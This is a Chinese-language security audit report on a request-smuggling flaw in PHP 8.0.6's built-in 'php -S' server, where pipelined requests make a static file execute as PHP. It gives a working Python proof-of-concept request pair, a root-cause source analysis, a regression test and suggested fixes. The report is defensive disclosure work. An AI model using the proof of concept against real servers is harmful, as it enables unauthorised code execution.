# `php -S` 请求走私导致静态文件被当作 PHP 执行联合审计报告

## 概述

目标为 PHP CLI 内置 Web Server，即 `php -S`。黑盒现象与源码审计均表明：在同一 TCP 连接中连续发送两条请求时，第二条不存在的 `.php` 请求可能错误复用第一条静态文件请求的解析结果，最终把静态文件当作 PHP 脚本执行。

- 黑盒复现范围：`PHP (cli)` 至少到 `8.0.6`
- 源码审计版本：`php-8.0.6`
- 对应提交：`ee186036499d62c33e68dae24c74cc36b7532faa`

## 黑盒复现

### 复现环境

```bash
docker pull php:8.0.6-cli
docker run -p 8888:8888 -it php:8.0.6-cli /bin/bash
php -S 0.0.0.0:8888
```

在站点根目录放置任意静态文件，例如 `flag.txt`：

```php
<?php phpinfo(); ?>
```

### 最小触发条件

同一连接中连续发送两条请求：

1. 第一条请求访问静态文件
2. 第二条请求访问不存在的 `.php` 文件

最小 PoC：

```python
import socket

host = "127.0.0.1"
port = 8888

raw_request = (
    b"GET /flag.txt HTTP/1.1\r\n"
    b"Host: 127.0.0.1:8888\r\n"
    b"\r\n"
    b"GET /xx.php?1=env HTTP/1.1\r\n"
    b"Host: 127.0.0.1:8888\r\n"
    b"\r\n"
)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.settimeout(5)
    s.connect((host, port))
    s.sendall(raw_request)
    data = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass

print(data.decode(errors="replace"))
```

### 黑盒结论

- 第一条请求命中静态文件
- 第二条请求使用不存在的 `.php` 路径
- 返回结果不是静态文件源码，而是静态文件内容被 PHP 解释后的结果
- `GET` 与 `POST` 参数均可生效

这说明问题不只是“错误路由”，而是已经发生了错误脚本分发。

## 源码审计

关键文件：

- `sapi/cli/php_http_parser.c`
- `sapi/cli/php_cli_server.c`

### 结论

漏洞由两段逻辑叠加造成：

1. `php_http_parser_execute()` 会在一次 `recv()` 得到的 buffer 中继续解析后续请求
2. `php_cli_server_client_read_request_on_message_begin()` 在新消息开始时没有重置 `client->request`
3. `php_cli_server_request_translate_vpath()` 对“带点但不存在”的路径会提前 `return`，但不会清空旧的 `path_translated/path_info/sb`
4. `php_cli_server_dispatch()` 仅依据 `ext == php` 与 `path_translated != NULL` 判定是否走脚本分发

最终形成错配：

- 第二条请求 `/xx.php` 提供了 `ext = php`
- 第一条请求 `/flag.txt` 残留了旧的 `path_translated`

因此静态文件被当作 PHP 执行。

### 关键代码点

#### 1. parser 在一条消息结束后继续进入下一条消息

- `sapi/cli/php_http_parser.c:252`
  - `# define NEW_MESSAGE() start_state`
- `sapi/cli/php_http_parser.c:1357-1366`
  - 对于无 body 的请求，`message_complete` 之后继续 `state = NEW_MESSAGE()`

#### 2. 新请求开始时未重置 request

- `sapi/cli/php_cli_server.c:1561-1563`
  - `php_cli_server_client_read_request_on_message_begin()` 直接返回，没有清理旧状态

#### 3. 不存在的静态风格路径提前返回，保留旧路径状态

- `sapi/cli/php_cli_server.c:1391-1394`
  - 只要路径中包含 `.`，就标记 `is_static_file = 1`
- `sapi/cli/php_cli_server.c:1425-1430`
  - 找不到真实文件且 `is_static_file` 为真时直接 `return`
- 该分支不会清空旧的 `request->path_translated`

#### 4. 脚本分发依赖新的后缀和旧的文件路径

- `sapi/cli/php_cli_server.c:1717-1736`
  - `on_message_complete()` 会根据当前 `vpath` 重算 `ext`
- `sapi/cli/php_cli_server.c:2172-2175`
  - `ext == php` 且 `path_translated != NULL` 时走脚本分发

## 根因总结

这是一个跨请求状态复用问题。`php -S` 在同一连接、同一读取周期内把两条请求混入同一个 `client->request` 对象，导致第二条请求的 `.php` 后缀与第一条请求的静态文件路径发生错配。

## 回归测试证据

已补充 `phpt` 回归测试：

- `sapi/cli/tests/php_cli_server_request_smuggling_static_exec.phpt`

测试逻辑：

1. 创建静态文件 `request_smuggling_static.txt`
2. 内容为 `<?php echo "PWNED"; ?>`
3. 在同一连接中连续发送：
   - `GET /request_smuggling_static.txt`
   - `GET /missing.php`
4. 正确行为应返回静态文件原始内容
5. 漏洞行为会返回：

```text
HTTP/1.1 200 OK
text/html; charset=UTF-8
PWNED
```

这说明静态文件已被解释执行，而不是按 `text/plain` 返回。

## 修复建议

以下任一方向都可以阻断该漏洞链，实际修复建议同时做状态清理与分发收紧：

1. 在 `on_message_begin()` 中重置或重建 `client->request`
2. 在 `php_cli_server_request_translate_vpath()` 开始前主动清空 `path_translated/path_info/ext/sb`
3. 在 `translate_vpath()` 早退分支显式设置 `path_translated = NULL`
4. 在读取到一条完整请求后停止继续解析后续字节，把剩余字节留给下一次独立请求处理

## 当前漏洞描述建议

`php -S` 内置服务器在处理同一 TCP 连接中的连续请求时，请求对象状态未正确隔离；当后续请求为不存在的 `.php` 路径时，会错误复用前一静态文件请求的 `path_translated`，从而将静态文件内容作为 PHP 脚本执行。
